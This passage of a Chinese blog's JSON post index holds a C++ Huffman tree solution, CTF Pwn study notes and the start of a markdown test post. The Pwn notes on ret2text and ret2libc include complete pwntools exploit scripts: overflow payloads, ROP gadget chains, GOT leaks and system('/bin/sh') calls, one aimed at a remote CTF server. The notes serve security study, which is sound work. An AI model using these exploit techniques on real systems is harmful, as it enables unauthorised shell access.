0;&#125;/*13.构建哈夫曼树哈夫曼叔的带权路径长描述现在给出一棵二叉树，每个结点有一个权值，希望你构造赫夫曼树，并输出其对应的带权路径长度输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n。第二行 n 个正整数，用一个空格分隔，第 i 个正整数vi，代表节点 i 的权值。输出一个数，表示对应赫夫曼树的带权路径长度样例输入31 1000 1000输出3002*///构建哈夫曼树的基本思想/*1.权值最小的在越后端 基本要求2.每次找到最小的两个权值，合成左右子树 函数1，Select两个最小节点不断合并3.root的权值=左加右，然后更新节点即可 函数2，构建哈夫曼树，不断调用函数1，最后只剩根节点4.计算带权路径长度总和 函数3：计算全部*///哈夫曼树的标准定义typedef struct&#123; int weight; // 结点的权值，为了方便直接用int int parent, lchild, rchild; // 左右孩子和双亲&#125; HTNode, * HuffmanTree;// 选择权值最小的两个结点void Select(HuffmanTree HT, int n, int&amp; index1, int&amp; index2) &#123; if (n &lt;= 1) return; index1 = index2 = 0; for (int k = 1; k &lt;= n; k++) &#123; //给index1赋初值 if (HT[k].parent == 0) &#123; index1 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //给index2赋初值 if (HT[k].parent == 0 &amp;&amp; k != index1) &#123; index2 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //找到最小的权值,赋给index1 if (HT[k].parent == 0 &amp;&amp; k != index2) &#123; if (HT[index1].weight &gt; HT[k].weight) &#123; index1 = k; &#125; &#125; &#125; HT[index1].parent = -1; //将最小的权值结点双亲改为-1，防止被index2选取 for (int i = 1; i &lt;= n; i++) &#123; //找到第二小的权值,赋给index2 if (HT[i].parent == 0 &amp;&amp; i != index1) &#123; if (HT[index2].weight &gt; HT[i].weight) &#123; index2 = i; &#125; &#125; &#125;&#125;// 构建哈夫曼树// HT为树,n为叶子结点数,w[]叶子的权值void CreateHuffmanTree(HuffmanTree&amp; HT, int n, int w[]) &#123; if (n &lt;= 1) // 如果结点小于等于1,直接退出 return; int m = 2 * n - 1; //总共有2*n-1个结点 HT = new HTNode[m + 1]; //为了方便,不用0号单元，HT[m]表示根结点,下表从1开始 /*给所有结点的左,右孩子以及双亲初始化为0;*/ for (int i = 1; i &lt;= m; ++i) &#123; HT[i].lchild = 0; HT[i].rchild = 0; HT[i].parent = 0; &#125; /*给前 n 个结点设置权重*/ for (int i = 1; i &lt;= n; i++) &#123; HT[i].weight = w[i]; &#125; /*给第 n 个结点之后的结点赋值,以及设置左右孩子和双亲*/ for (int i = n + 1; i &lt;= m; ++i) &#123; int s1 = -1, s2 = -1; // s1 和 s2 分别为权值最小和次小的结点下标 /* 调用Select函数 在前 i-1 个没有双亲的结点中返回权重最小的结点序号s1,s2 */ Select(HT, i - 1, s1, s2); /* 将第 s1,s2 号结点的双亲设置为第 i 个结点 同时意味着下次调用Select函数将忽略s1,s2 */ HT[s1].parent = i; HT[s2].parent = i; /*s1,s2分别作为i的左右孩子*/ HT[i].lchild = s1; HT[i].rchild = s2; /*i 的权值为左右孩子权值之和*/ HT[i].weight = HT[s1].weight + HT[s2].weight; &#125;&#125;// 计算哈夫曼树的带权路径长度int CalculateWPL(const HuffmanTree&amp; HT, int n) &#123; int wpl = 0; for (int i = 1; i &lt;= n; ++i) &#123; int depth = 0; int j = i; while (HT[j].parent != 0) &#123; j = HT[j].parent; depth++; &#125; wpl += HT[i].weight * depth; &#125; return wpl;&#125;int main() &#123; int n; cin &gt;&gt; n; int* weights = new int[n + 1]; // 为了方便，不使用0号单元 for (int i = 1; i &lt;= n; ++i) &#123; cin &gt;&gt; weights[i]; &#125; HuffmanTree ht; CreateHuffmanTree(ht, n, weights); int wpl = CalculateWPL(ht, n); cout &lt;&lt; wpl &lt;&lt; endl; delete[] ht; // 释放动态分配的内存 delete[] weights; // 释放动态分配的内存 return 0;&#125;","path":"computer-science/Data-Structures/cpp/二叉树题解/","date":"11-10","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"Pwn复习-初级ROP","text":"# 一.ROP 编程介绍 ​ 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 ​ 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 1. 程序存在溢出，并且可以控制返回地址。 2. 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 3. 如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 # 二.ret2text # 1. 原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 注： ret2text 即控制返回地址指向程序本身已有的的代码 (.text) 并执行 # 2.x64 和 x86 函数调用方式不同导致 ret2text 布栈不同 # 2.1 函数调用约定 _cdecl: c/c++ 默认方式，参数从右向左入栈，主调函数负责栈平衡。 _stdcall: Windows API 方式，参数从右向左入栈，被调函数负责栈平衡。 _fastcall: 快速调用方式。即将参数优先从寄存器传入（ecx 和 edx），剩下的参数从右向左入栈。由于栈位于内存区域，而寄存器位于 cpu 内，存取快于内存。 这里讲述默认的 gcc 调用约定_cdecl 的一些特点。 x86 使用栈传递参数 使用 eax 存放返回值 x64 前六个参数依次存放于 rdi，rsi，rdx，rcx，r8，r9 中 多余的参数存放于栈中 # 3. 解法举例 # 3.1x86 题解方法 对于函数传参的函数，其栈格式为： 故而我们需要利用溢出覆盖返回地址进入 func 函数内部，再将参数一指向 “/bin/sh” 的储存地址即可。其中要注意的是 r 处需要我们进行垃圾数据的填充。 现在利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解） 注意这种 x86 是要进入 func 函数，然后把参数一覆盖成 bin/sh, 因此有三个参数，payload = padding*b'a' + p32 (ret_addr) + p32 (0) + p32 (sh_addr) 书写 payload： 行高亮12345678910111213141516171819202122232425`from pwn import * context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) file = &#x27;./ret2text_func2_x86&#x27; io = process(file)elf = ELF(file)rop = ROP(file) sh_addr = 0x804c018ret_addr = elf.symbols[&#x27;func&#x27;]padding = 0x14 payload = padding*b&#x27;a&#x27; + p32(ret_addr) + p32(0) + p32(sh_addr) dem = b&#x27;inputs:&#x27;io.sendlineafter(dem,payload)io.interactive()` 成功 # 3.2x64 解题方法 对 x64 的参数，大部分情况下，前六个参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要解除 ROPgadget 工具进行辅助。 ROP (Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到可执行文件中已有的片段代码中执行我们选择的代码段。 知道了 ROP 工具的功能，我们需要做的是 修改 rdi 的值（可使用代码 pop rdi ; ret） 在栈中放入‘bin/sh’经由 pop 提交给 rdi 进入 func 函数内调用 system 函数 利用 gdb 查找 func 函数地址和 sh 存放地址（具体偏移量由 ida 查看不再详细讲解）： 利用 ROPgadget 查找需要的代码行 --pop rdi ; ret 行高亮1ROPgadget --binary ret2text_func2_x64 --only &#x27;pop|ret&#x27; payload = padding*b'a' + p64 (pop_rdi_ret) + p64 (sh_addr)+ p64 (ret_addr) #64 位三步走原则 构造 payload： 行高亮1234567891011121314151617181920212223242526`from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)#打开路径file = &#x27;./ret2text_func2_x64&#x27; io = process(file) elf = ELF(file) rop = ROP(file) #调试gdb.attach(io)pause()sh_addr = 0x404028 ret_addr = elf.symbols[&#x27;func&#x27;] #这个可以自己找，也可以调用函数帮你找 pop_rdi_ret = 0x40121b #这个用gadget就行 padding = 0x10payload = padding*b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64位三步走原则 dem = b&#x27;inputs:&#x27; io.sendlineafter(dem,payload) io.interactive()` 运行成功 pwn 掉 # 3.3x86 举例 其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。 首先，查看一下程序的保护机制 行高亮123456➜ ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 行高亮1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现 行高亮1234567891011121314151617181920212223.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system 在 secure 函数又发现了存在调用 system (&quot;/bin/sh&quot;) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。 下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。 行高亮123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下 行高亮1234567gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf); ──────────────────────────────────────────────────────────────── 行高亮12345678910──────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断 s 的地址为 0xffffcd5c s 相对于 ebp 的偏移为 0x6c s 相对于返回地址的偏移为 0x6c+4 最后的 payload 如下： 这种 x86 直接就是主函数中有输入函数，具体题目中二者区别不大，有时都能打通 行高亮1234567##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() # 3.3x86 题解补充疑问（为什么加 p32 (0)）- 栈对齐 对于本题的函数传参，我们的栈帧构造初步想法如图 ebp ‘aaaa’ r return to func 参数一 “/bin/sh” 输入适量垃圾填充 padding * b 'a' 覆盖返回地址指向 func 函数 p32 (ret_addr) 参数 &quot;/bin/sh&quot; 地址 则 payload = padding*b'a' + p32 (ret_addr) + p32 (sh_addr) 然而这样的脚本在攻击时会出错。原因在于： 正常的函数调用 call 来达到 push eip；jmp 的作用，经过初步 payload 构造的攻击如下图所示，是通过覆盖 return 达到 jmp 的作用的，并没有像 call 一样 push eip 到栈中。 故而 ret 执行后，ebp 后为我们输入的参数而非 eip 原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用 ret2text 覆盖 pwn 题时候，需要自行加入一行栈帧的填充。 # 三.ret2libc # I. 灵魂五问 1. 没有写 system 就一定没有 system？ 答：有 system， 在 libc 里面，别人写好的 2. 怎找到 libc 基地址 ？ 答：使用输出 libc 其中的函数地址，从而计算基地址 3. 怎么输出 libc 其中的函数地址？ 答：模仿程序如何找 libc 其中的函数地址的方式去寻找。 4. 怎把 GOT 表项内容打印出来。 答：利用输出函数泄露 got 表内容。 5. 怎么找到 system binsh 地址 答：利用偏移计算 常用会用到的指令： 行高亮123`readelf -a b|less # ROPgadget --binary 文件名 --only &quot;pop|ret&quot; #找特定gadget#寄存器ldd 文件名 #看动态链接 # II. 自己的理解 1. 我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 ​ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集 ​ 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 2. 那么如何得到 libc 中的某个函数的地址呢？ ​ 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里我们泄露 libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下 1. 泄露 libc_start_main 地址 2. 获取 libc 版本 3. 获取 system 地址与 /bin/sh 的地址 4. 再次执行源程序 5. 触发栈溢出执行 system (‘/bin/sh’)** # III. 解法举例 # 1)x64: # 0. 调用约定 64 位系统中使用寄存器传递参数：rdi、rsi、rdx、rcx、r8、r9（1-6 个参数） 参考：http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/ 要构造 write (1,buf2,20)，需要控制 3 个参数：rdi、rsi、rdx， 第 3 个参数代表输出的 size，如果没有 rdx 的 gadget 可以暂时不管，输出多少无所谓， 在下面我们构造 payload 的时候，我们不写第 3 个参数 # 0.1 举例 行高亮1234567891011当我们覆盖到rbp后回忆函数调用的流程，把rbp的下一个地址开始原来存的东西覆盖成我们想要的地址第一次： 第二次回到main----rbp(esp0-16)(ida-&gt;s)：覆盖完 ----同理----esp0-8(ida-&gt;r): &quot;pop_rdi_rsi_rdxret&quot; ----&quot;pop_rdi_ret&quot;----esp0: &quot;rdi&quot; &quot;1&quot; ----&quot;/bin/sh_addr&quot;----esp0+8: &#x27;pop_rsi_r15_ret&#x27; ----&quot;system_addr&quot; ----esp+16:&quot;leak_func_got&quot; 这次布栈就像ret_text中的system函数一样来布----esp+24:&quot;r15&quot; 8位可以是&quot;deadbeef&quot;----esp+32:&quot;泄露GOT真正地址的函数如write_sym&quot;----esp+40:&#x27;返回地址&#x27; # 1.padding 首先我们需要确定 padding，在哪里溢出，把这个空填满，溢出到 rbp 完 ----padding 和以前一样，看哪里 gets 或者 read 函数，这里其实就是 scanf ---- 可以通过 ida 或者动态调试得到 ---- 参考以前的题目，像 buuctf 前几道 rip,level.. # 2. 第一次溢出，目标获得的 libc 某个函数的真实地址 # 2.1 第一次溢出 比如：以下是 write 函数为例 行高亮1234567891011121314151617leak_func_name =&#x27;write&#x27; leak_func_got = elf.got[leak_func_name] # leak_func_got泄露的got表 去ida上看write的地址 #got.plt:0000000000404018 48 unk_404018 db 48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)#leak_func_got = 404018return_addr = elf.symbols[&#x27;dofunc&#x27;]write_sym = elf.symbols[&#x27;write&#x27;]pop_rdi_ret = 0x4011fb #用ROPgadget查的pop_rsi_r15_ret = 0x4011f9#同上payload = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)# 产生溢出的字符串 pop_rdi_ret rdi存的值 pop_rsi_r15_ret leak_func_got泄露的got表 r15# 第一个参数 第二个参数（rdx第三个参数没有先不管）# 第一步 第2步rdi 【 第三步 plt表 】 第四步got表 第五步填deedbeef payload = payload + p64(write_sym) + p64(return_addr) # 第六步write偏移地址 第七步返回地址（进入第二次溢出的返回地址） delimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload) # 2.2 收获这个函数的真实地址 行高亮12345678910gets_addr=u64(p.recv()[:8]) #p.recv()[:8]: 这个部分是将从管道中接收到的数据的前 8 个字节切片出来。u64换成无符号整数#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) # 接收puts的真实地址#p.recv(6): 从管道中接收 6 个字节的数据。.ljust(8, b&#x27;\\x00&#x27;): 对接收到的 6 个字节数据进行填充，#使其总长度为 8 字节，填充内容是 0x00 字节。以后可以不是6位#puts_addr=u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;)) #得到 puts 函数 的地址;#p.recvuntil(&#x27;\\n&#x27;): 从管道中接收数据，直到遇到换行符 \\n 为止。这个函数会将接收到的数据包括换行符在内全部返回。#[:-1]: 使用切片操作，去掉接收到的数据中的最后一个字符，即换行符 \\n。#.ljust(8, &#x27;\\0&#x27;): 将剩余的数据（不包括换行符）进行填充，使其总长度为 8 字节，填充内容是空字符 \\0。 # 3. 第二次溢出构造 payload2 # 3.1 获得基地址 行高亮12libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#本地调试，可用ldd查libc_base=gets_addr-libc.symbols[&quot;gets&quot;] # 得到基地址 # 3.2 算 system 和 binsh 地址 行高亮12system_addr=libc_base+libc.symbols[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;)) 行高亮12345#远程版本libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到基地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址 # 3.3 获取 shell 行高亮1234567payload2=offset*b&quot;B&quot;+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) #64位三步走，和rettext一样一般会接收到程序本身的字符串后，再发送payloaddelimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload2)pause()io.interactive() # 2）x86: 最大区别是参数存放不用寄存器 # 0. 使用条件 ret2libc 的使用条件 泄漏 Libc 函数地址的条件：程序有输出函数，如 puts、printf、write；要输出函数的目的是要泄漏地址 实现：设置好输出函数的参数为某函数 GOT 表地址；GOT 表中保存已调用过的函数的真实地址 # 1. 核心 泄漏 ret2libc_32 任意一个函数的位置 获取 libc 的版本 根据偏移获取 shell 和 sh 的位置 执行程序获取 shell # 2. 内存分布，举例 ---esp --- ... --- buf ---ebp 栈帧 ---write@plt 返回地址 ---main @@@@@' 预留返回地址！！！！！！！！'@@@@ --- 1 write 函数参数一 (1) ---write_got 地址 write 函数参数二 (write_got 地址) --- 4 write 函数参数三 (写 4 字节) 32 位 --- 高地址，栈底 # 3. 第一次溢出，目标：找到一个函数地址 第一个以 write 为例子： 行高亮1234567write_plt=e.plt[&quot;write&quot;]write_got=e.got[&quot;write&quot;]main_addr=e.symbols[&quot;main&quot;]# char[88] ebp write函数参数一(1) write函数参数二(write_got地址)payload=0x88*b&#x27;a&#x27;+ p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got)+p32(4)# write函数返回地址 (返回到main函数) write函数参数三(写4字节)32位# 0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)其实是char和ebp分开的，可以合起来算 ' 为什么加 1，加 4' 原因：write 函数本身有三个参数（1，'hello!',5） 函数说明：write () 会把参数 buf 所指的内存写入 count 个字节到参数 fd 所指的文件内。 返回值：如果顺利 write () 会返回实际写入的字节数（len）。当有错误发生时则返回 - 1，错误代码存入 errno 中。 //write(int fd, const void *buf, size_t count); 第一个参数 文件描述符 fd 1 输出，0 输入 第二个参数 无类型的指针 buf，可以存放要写的内容 第三个参数 写多少字节数 4 字节 下面再举一个：我们决定用泄露__libc_strart_main 的地址，来判定 libc 的版本 行高亮12345678#泄露地址puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])#调用puts函数后，ret到main函数，用main函数里面的gets来获取libc_start的地址sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)gets_addr = u32(p.recv()) # 4. 第二次溢出，目标：直接获得 shell，像 rettext 一样 # 4.1 获得基地址 行高亮12libc = ELF(&quot;/lib32/libc.so.6&quot;) #获得libc版本号libc_base = gets_addr - libc.symbols[&quot;gets&quot;] # 4.2system 和 binsh 地址 行高亮12system_addr = libc_base + libc.symbols[&quot;system&quot;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;)) # 4.3 结束 行高亮123payload2 = padding*b&quot;A&quot; + p32(system_addr) + p32(0) + p32(bin_sh_addr) #32位两步走p.sendline(payload2)p.interactive() # 4.4 补充 大佬 1 号心得 ROP 中对 retlibc 技术的一些学习心得 漏洞利用思路： 1. 找到泄露库函数地址的漏洞，获取 libc 版本（因为一般不会给你 libc.so 文件） 查询 libc 版本一般有三种方法： 1.libcsearcher 库。在编写 exp 的时候用 from LibcSearcher import LibcSearcher 导入 通过 libc.dump ('system') 可以得到 system 函数的偏移，libc.dump ('str_bin_sh') 得到 binsh 字符串的偏移 2.pwntools 自带的 Dynelf，需要先构造一个 leak 函数和一个可以不断触发溢出的漏洞 一个模板： 行高亮12345678910def leak(address): #各种预处理 payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot; p.send(payload) #各种处理 data = p.recv(4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak, elf=ELF(&quot;./xxx&quot;)) #初始化DynELF模块 systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) #在libc文件中搜索system函数的地址 3. 在线查询网站，通过函数的后三位数值查询。https://libc.blukat.me 典型的题目–adworld 里的 level1（非常典型的 retlibc） 源码： 行高亮12345678910111213141516171819202122232425262728293031323334353637383940414243ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] printf(&quot;What&#x27;s this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); //溢出点&#125;exp：from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#sh = process(&#x27;./level1&#x27;)sh=remote(&#x27;111.198.29.45&#x27;,42536)writeplt= 0x08048370readgot=0x0804A00Cvuln=0x0804847Bpayload = &#x27;a&#x27;*0x8c+p32(writeplt)+p32(vuln)+p32(1)+p32(readgot)+p32(4)#gdb.attach(sh)sh.sendline(payload)readaddr=u32(sh.recv(4))print(hex(readaddr))libc = LibcSearcher(&#x27;read&#x27;, readaddr)libcbase = readaddr - libc.dump(&#x27;read&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload=&#x27;a&#x27;*0x8c+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)sh.sendline(payload)sh.interactive()sh.close() 笔记: context.log_level='debug’开启调试模式； 大佬原文链接：https://blog.csdn.net/qq_41706924/article/details/89607683","path":"CTF/Pwn/note/Pwn1/","date":"11-08","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn概述","text":"# 0X01 Pwn 简介 # 软件安全：软件安全专注于研究软件的设计和实现的安全 研究对象：代码（源码、字节码、汇编等） 研究目标：发掘漏洞、利用漏洞、修补漏洞 研究技术：逆向工程、漏洞挖掘与利用、漏洞防御技术 CTF PWN：软件安全研究的一个缩影 # 研究对象：可执行文件，主要是 ELF 文件 研究最终目标：夺取 Flag 软件安全与 CTF PWN 特点：入门难、进阶难、精通难。 # 工具： 静态分析：IDA Pro 动态调试：gdb (with peda or gef)、windbg、ollydbg Exploit：pwntools、zio # 前置技能： 汇编语言：程序执行、函数栈帧、函数调用等 编译、链接、装载、执行 ELF 文件结构 Linux 系统相关：文件描述符、系统调用、socket 编程、shell 命令 编译原理，操作系统，计算机组成原理 # 0X02 PWN 学习方法 # 学习阶段一：学习套路 套路是有限的，假以时日一定会学完的招式 针对每种套路都练习 1~2 道习题 学习完所有常见套路，大多数国内比赛的中档题基本都可以随便切 # 学习阶段二：总结套路，变套路为艺术 漏洞利用是一门艺术，难以用套路完全概况，要想切难题不能全靠套路 多刷刷国际赛的难题，刷的慢没关系，刷多了自然就会融会贯通 多总结思考现有的套路的本质 # 资源： CTF Writeup Github：https://github.com/ctfs 聚合了各大国际比赛的习题文件以及 writeup Googling:XXX writeup or XXX CTF 百度收录不了 github pages 0X03 PWN 学习案例 ROP： 1、ROP：现代栈溢出中最基础的利用技术（最简单最基础的套路） 2、Googling 筛选到比较好的题目：r0pbaby 学习 writeup，可以参考多篇 writeup，根据 writeup 和学到的内容自己动手调试一下，尽量自己动手重写 EXP 重写 EXP 成功：基本掌握了 ROP。 第二章 CTF 中漏洞挖掘的方法论：从逆向工程到漏洞挖掘 0X01 逆向工程简介 对于 PWN 来说，逆向工程的主要作用为发掘与分析漏洞 工具： 静态分析工具：IDA pro 动态调试工具：gdb、windbg、ollydbg、IDA Pro IDA pro 的 F5 大法 0X02 常见漏洞简介 在进行漏洞挖掘之前，必须对常见漏洞非常熟悉！！！ 缓冲区溢出（Buffer Overflow） 堆溢出、栈溢出、bss 溢出、data 溢出（通常覆盖指针） wellpwn、AliCTF 2016 vss、Hitcon 2015 readable、stkof、zerostorage 整数溢出（Integer Overflow） 无符号型与有符号的转换（MMACTF 2016 shadow） 整数加减乘除法，如 malloc (size*2) (pwnhub.cn calc) 整数溢出通常会进一步转换为缓冲区溢出、逻辑漏洞等其他漏洞 格式化字符串（Format String） printf (s)、sprintf (s)、fprintf (s) 等，可能导致任意地址读写（MMACTF 2016 greeting） 可以用来 leak（HCTF2016 fheap） 释放后使用（Use-After-Free） 释放掉的内存可能会被重新分配，释放后使用会导致重新分配的内存被旧的使用所改写 Double free 是一种特殊的 UAF Defcon 2014 Qualifier shitsco、AliCTF 2016 router、0CTF2016 freenote（double free）、HCTF2016 fheap（double free） 逻辑漏洞 访问控制、协议漏洞、多线程竞态条件（fake fuzz）等 0X03 漏洞挖掘中的逆向技巧 关键数据结构分析：还原结构体、接口、类等 控制流分析：理清楚程序的执行逻辑，基本要做到从反汇编代码到源码的还原 数据流分析：理清楚数据的流向 CTF 漏洞挖掘中的分析策略： 目标文件较小时，通常采用对整个目标文件进行控制流分析，做到整个程序从反汇编代码到接近源码级别的还原，还原的同时查找漏洞 目标文件较大时，逆向整个文件所需工作量太大，通常需要额外的关注数据流，并理清楚数据流所经之处的控制流，因为漏洞的触发与数据流离不开关系 无论是数据流分析和控制流分析，还原结构体、接口、类都会促进逆向工程 控制流分析的主要作用是理清楚程序的逻辑，对于规模较小的目标文件，一般选择理清整个目标文件。 代码以识别为主，不要硬逆。 善用标记，标记结构体、标记变量名、标记变量类型 F5 大法好，但是 F5 不是万能的，当发现 F5 结果比较诡异时需要在汇编层分析（如 mmactf 2016 shadow） 数据流分析 目标文件较大，全盘逆向不现实 追溯用户输入的走向，重点关注对用户输入数据处理的函数 可以在不用逆清楚控制流即可找到漏洞，需要一定的技巧性 （plaid CTF 2015 datastore） 原文链接：https://blog.csdn.net/prettyX/article/details/103173220","path":"CTF/Pwn/note/PWN概述/","date":"11-05","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Markdown Style test","text":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly. # Headers 行高亮1234567891011121314# H1## H2### H3#### H4##### H5###### H6Alternatively, for H1 and H2, an underline-ish style:Alt-H1======Alt-H2------ # H1 # H2 # H3 # H4 # H5 # H6 Alternatively, for H1 and H2, an underline-ish style: # Alt-H1 # Alt-H2 # Emphasis 行高亮1234567Emphasis, aka italics, with *asterisks* or _underscores_.Strong emphasis, aka bold, with **asterisks** or __underscores__.Combined emphasis with **asterisks and _underscores_**.Strikethrough uses two tildes. ~~Scratch 